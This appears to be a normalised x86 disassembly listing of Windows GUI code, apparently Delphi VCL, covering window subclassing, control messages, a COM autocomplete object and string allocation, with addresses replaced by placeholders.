call sub_4535f4
mov eax [ ebx + 0x280 ]
call sub_45cbd0
push eax
push 0x0
push 0x402
mov eax ebx
call sub_456054
push eax
call PostMessageA
pop esi
pop ebx
retn
sub_43ef2c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_456358
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_45cbd0
push eax
xor ecx ecx
mov edx 0x402
mov eax ebx
call sub_450a20
sub_43ef58
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi ]
add eax 0xffff42ce
sub eax 0x7
jae r-xdata
mov edx esi
mov eax ebx
call sub_446ec0
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x289 ] 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_424bf4
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_43efa0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44ed24
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x280 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_43ee98
sub_43efd0
push ebx
mov ebx eax
mov eax ebx
call sub_451444
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x289 ] 0x2
jae r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43eff8
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_455588
mov eax ebx
call sub_456358
test al al
je r-xdata
add esp 0x10
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x270 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x240 ]
test eax eax
je r-xdata
push 0x0
lea edx [ esp + 0x4 ]
push edx
push eax
call InvalidateRect
push 0x0
lea edx [ esp + 0x4 ]
push edx
push eax
call InvalidateRect
sub_43f058
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_450ef0
mov eax ebx
call sub_44fa7c
test al al
je r-xdata
cmp [ ebx + 0x289 ] 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_466768
test eax eax
je r-xdata
push 0x15
call GetSystemMetrics
mov edx [ ebx + 0x48 ]
sub edx eax
movsx eax [ esi + 0x8 ]
cmp edx eax
jle r-xdata
cmp ebx [ eax + 0x220 ]
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_44ff14
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_44fa8c
sub_43f0f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43f403
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4472e4
push 0x5
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call GetWindow
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x248 ] ebx
mov esi ebx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x270 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x274 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
call SetWindowLongA
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x289 ]
sub al 0x2
jae r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x5
push 0x5
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call GetWindow
push eax
call GetWindow
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x284 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x240 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x289 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x280 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x288 ] 0x1
xor eax eax
push ebp
push sub_43f307
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x284 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
call sub_419720
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
push 0x0
push 0x3
push 0xd3
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
mov esi ebx
mov [ eax + 0x240 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x250 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
push eax
call SetWindowLongA
mov eax [ ebp - 0x4 ]
mov esi ebx
mov [ eax + 0x244 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x258 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
push eax
call SetWindowLongA
push 0x2
push ebx
call GetWindow
mov ebx eax
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x28a ]
mov eax [ ebp - 0x4 ]
call sub_43f43c
mov eax [ ebp - 0x4 ]
add eax 0x268
call sub_405944
mov eax [ ebp - 0x4 ]
add eax 0x268
call sub_405944
push eax
push sub_43f410
push 0x1
push 0x0
mov eax [ rw-data ]
push eax
call CoCreateInstance
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x268 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
call sub_45cbd0
push eax
push 0x0
push 0x402
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call PostMessageA
mov eax [ ebp - 0x4 ]
add eax 0x284
call sub_40d564
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_44f948
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x288 ] 0x0
retn
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f40a
lea eax [ ebp - 0x8 ]
call sub_405944
retn
push 0x0
push 0x0
push 0x407
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call SendMessageA
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x28c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43fd6c
mov edx eax
test edx edx
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_40595c
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43f5d0
sub edx 0xffffffec
sub_43f43c
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
xor edi edi
mov al [ esp ]
mov [ ebx + 0x28a ] al
mov eax ebx
call sub_456358
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov esi rw-data
jae r-xdata
and edx 0x7f
bt [ ebx + 0x28a ] edx
inc eax
add esi 0x4
cmp al 0x5
jne r-xdata
or edi [ esi ]
mov edx eax
cmp dl 0x7
ja r-xdata
push edi
push 0x0
push 0x40e
mov eax ebx
call sub_456054
push eax
call SendMessageA
sub_43f49c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_456b24
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0xa4 ]
mov eax edi
call sub_43ee98
cmp [ edi + 0x280 ] 0x0
jne r-xdata
mov edx [ esi + 0xc8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
test bl bl
je r-xdata
sub_43f500
push ebx
mov ebx eax
mov eax ebx
call sub_4474cc
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_456358
test al al
je r-xdata
mov eax ebx
call sub_4535f4
sub_43f544
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28c ]
call sub_419720
test eax eax
jle r-xdata
mov eax ebx
call sub_4533f0
pop esi
pop ebx
retn
cmp [ ebx + 0x284 ] 0x0
jne r-xdata
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4194e8
mov esi eax
mov [ ebx + 0x284 ] esi
mov edx [ ebx + 0x28c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_43f594
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_456358
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
call GetFocus
cmp eax [ esi + 0x240 ]
je r-xdata
mov bl 0x1
cmp eax [ esi + 0x244 ]
je r-xdata
cmp eax [ esi + 0x270 ]
je r-xdata
xor ebx ebx
jmp r-xdata
sub_43f5d0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43f6cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_456358
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f6d4
lea eax [ ebp - 0x4 ]
call sub_405944
retn
cmp [ ebx + 0x268 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
call sub_405944
mov ecx eax
mov edx sub_43f6d8
mov eax [ ebx + 0x268 ]
call sub_40d574
test al al
je r-xdata
test [ ebx + 0x26c ] 0x1
setne al
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x268 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov al [ r-xdata ]
cmp al [ ebx + 0x26c ]
jne r-xdata
xor eax eax
test [ ebx + 0x26c ] 0x1
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
jmp r-xdata
test [ ebx + 0x26c ] 0x2
je r-xdata
or eax 0x1
test [ ebx + 0x26c ] 0x4
je r-xdata
or eax 0x2
test [ ebx + 0x26c ] 0x8
je r-xdata
or eax 0x4
test [ ebx + 0x26c ] 0x10
je r-xdata
or eax 0x8
test [ ebx + 0x26c ] 0x20
je r-xdata
or eax 0x10
test [ ebx + 0x26c ] 0x40
je r-xdata
or eax 0x20
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
jmp r-xdata
or eax 0x40
sub_43f6d8
ror [ ebx - 0x40 ] 0xea
xchg ecx eax
aaa
rcl [ ecx ] cl
mov ebx 0x97600095
jpo r-xdata
retn
dec esp
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov eax [ eax + 0x14 ]
call sub_43e930
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax ebx
call sub_419390
pop esi
pop ebx
retn
sub_43f710
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov eax [ eax + 0x14 ]
call sub_43e930
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax ebx
call sub_419390
pop edi
pop esi
pop ebx
retn
sub_43f740
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_43f79e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41964c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_456358
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f7a5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_4535f4
sub_43f7a8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403280
mov eax edi
mov edx [ eax ]
call [ edx + 0x84 ]
push eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x80 ]
mov ecx esi
mov dl 0x1
call sub_4304f8
mov [ edi + 0x14 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_43f804
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
lea eax [ esi + 0x14 ]
call sub_40d564
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419ab0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_43f840
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43f97d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_4304c0
mov edx [ eax + 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_404144
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4304c0
mov eax [ eax + 0x10 ]
push eax
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_4304c0
pop edx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4304c0
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_4304c0
mov eax [ eax + 0x18 ]
mov [ ebp - 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4304c0
mov eax [ eax + 0x18 ]
push eax
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_4304c0
pop edx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4304c0
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_4304c0
mov eax [ eax + 0x1c ]
mov [ ebp - 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4304c0
mov eax [ eax + 0x1c ]
push eax
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_4304c0
pop edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4304c0
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_4304c0
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4304c0
mov eax [ eax + 0x20 ]
push eax
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_4304c0
pop edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4304c0
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f984
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_43f98c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4304c0
mov edx [ eax + 0x10 ]
mov eax edi
call sub_404100
pop edi
pop esi
pop ebx
retn
sub_43f9e0
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax [ edi + 0x14 ]
call sub_419720
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_4304c0
mov eax [ eax + 0x10 ]
mov edx ebp
call sub_4080b0
test eax eax
jne r-xdata
sub_43fa48
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4304c0
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x14 ]
pop edi
pop esi
pop ebx
retn
sub_43fa68
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
pop edi
pop esi
pop ebx
retn
sub_43fa90
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
call sub_456358
test al al
je r-xdata
pop esi
pop ebx
retn
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_456054
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
mov eax [ esi + 0x10 ]
call sub_44fd90
sub_43fba0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40455c
xor eax eax
push ebp
push sub_43fc08
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_438a20
mov ebx eax
mov ecx esi
xor edx edx
mov eax ebx
call sub_438678
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4384c0
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_438570
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fc0f
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_43fc18
push ebx
push esi
mov esi edx
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_438a20
mov ebx eax
mov ecx [ esi + 0x18 ]
xor edx edx
mov eax ebx
call sub_438678
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_4384c0
mov edx [ esi + 0x14 ]
mov eax ebx
call sub_438570
pop esi
pop ebx
retn
sub_43fc50
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x20 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403460
mov edx edi
mov eax esi
call sub_43c014
sub_43fc84
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40455c
xor eax eax
push ebp
push sub_43fce4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_403460
push esi
push 0xffffffff
push 0xffffffff
mov edx [ ebp + 0x8 ]
push edx
mov eax [ eax + 0x28c ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_43e93c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fceb
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_43fcf4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_403460
mov edx [ ebx + 0x18 ]
push edx
push 0xffffffff
push 0xffffffff
mov ecx [ ebx + 0x14 ]
push ecx
mov eax [ eax + 0x28c ]
mov ecx edx
mov edx [ ebx + 0x10 ]
call sub_43e93c
pop esi
pop ebx
retn
sub_43fd28
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov ecx [ ebx + 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43fd6c
mov esi eax
mov eax [ ebp + 0xc ]
mov edx esi
test edx edx
je r-xdata
xor edx edx
mov [ eax ] edx
call sub_40595c
mov eax [ ebx + 0x10 ]
mov [ esi + 0x10 ] eax
xor eax eax
pop esi
pop ebx
pop ebp
retn 0x8
sub edx 0xffffffec
sub_43fd6c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403280
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_43fdb4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0xc ]
call sub_4304c0
mov edx [ eax + 0x10 ]
mov eax edi
call sub_404100
pop edi
pop esi
pop ebx
retn
sub_43fdd8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_43fe9e
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_43fda8
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jge r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ ebp - 0x8 ]
jl r-xdata
cmp ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ eax ] ebx
lea ecx [ ebp - 0xc ]
mov edx [ esi + 0x10 ]
mov eax esi
call sub_43fdb4
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_404904
mov eax [ ebp - 0x4 ]
call sub_404924
mov edi eax
add edi edi
lea eax [ edi + 0x2 ]
push eax
call CoTaskMemAlloc
mov edx [ ebp + 0x10 ]
mov [ edx + ebx * 4 ] eax
lea edx [ edi + 0x2 ]
mov eax [ ebp + 0x10 ]
mov eax [ eax + ebx * 4 ]
xor ecx ecx
call sub_402cc4
mov eax [ ebp + 0x10 ]
mov eax [ eax + ebx * 4 ]
mov ecx edi
mov edx [ ebp - 0x4 ]
call sub_406c84
inc ebx
inc [ esi + 0x10 ]
mov ebx 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fea5
lea eax [ ebp - 0xc ]
call sub_4040ac
lea eax [ ebp - 0x4 ]
call sub_4047b8
retn
sub_43fec4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_43fda8
mov edx [ ebp + 0xc ]
add [ ebx + 0x10 ] edx
cmp eax [ ebx + 0x10 ]
jle r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
mov eax 0x1
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_43fef0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43ff5f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ff66
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404b08
mov eax rw-data
mov edx [ r-xdata ]
call sub_404b08
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4401b8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_42c97c
mov [ esi + 0x5 ] al
call sub_436154
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_4409fc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_440204
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax esi
call sub_4402a4
call sub_42c7bc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_440238
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_4402a4
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_4402e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_440238
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_440334
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_440238
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_440378
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_440238
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_4403e0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_404924
push eax
mov eax esi
